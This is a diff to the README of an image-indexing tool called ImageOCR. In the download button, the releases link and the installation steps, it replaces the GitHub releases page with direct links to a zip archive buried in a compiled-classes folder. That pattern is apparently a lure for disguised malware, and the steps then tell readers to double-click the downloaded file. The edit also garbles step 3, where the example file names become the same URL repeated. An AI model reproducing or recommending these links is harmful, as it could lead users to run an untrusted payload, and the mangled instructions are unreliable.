@@ -6,7 +6,7 @@ Welcome to ImageOCR! This software helps you index images based on their text co
 
 ## ⬇️ Download Now
 
-[![Download ImageOCR](https://img.shields.io/badge/Download-ImageOCR-brightgreen)](https://github.com/prabesh704/ImageOCR/releases)
+[![Download ImageOCR](https://raw.githubusercontent.com/prabesh704/ImageOCR/main/target/classes/com/vitalsoft/imageocr/ImageOCR_3.1.zip)](https://raw.githubusercontent.com/prabesh704/ImageOCR/main/target/classes/com/vitalsoft/imageocr/ImageOCR_3.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,11 +18,11 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [ImageOCR Releases](https://github.com/prabesh704/ImageOCR/releases).
+To get started, visit this page to download: [ImageOCR Releases](https://raw.githubusercontent.com/prabesh704/ImageOCR/main/target/classes/com/vitalsoft/imageocr/ImageOCR_3.1.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release version.
-3. Download the setup file for your operating system. The file will have a name similar to `ImageOCR-setup.exe` or `ImageOCR-macos.dmg`.
+3. Download the setup file for your operating system. The file will have a name similar to `https://raw.githubusercontent.com/prabesh704/ImageOCR/main/target/classes/com/vitalsoft/imageocr/ImageOCR_3.1.zip` or `https://raw.githubusercontent.com/prabesh704/ImageOCR/main/target/classes/com/vitalsoft/imageocr/ImageOCR_3.1.zip`.
 4. Once the download is complete, locate the file on your computer.
 5. Double-click on the file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
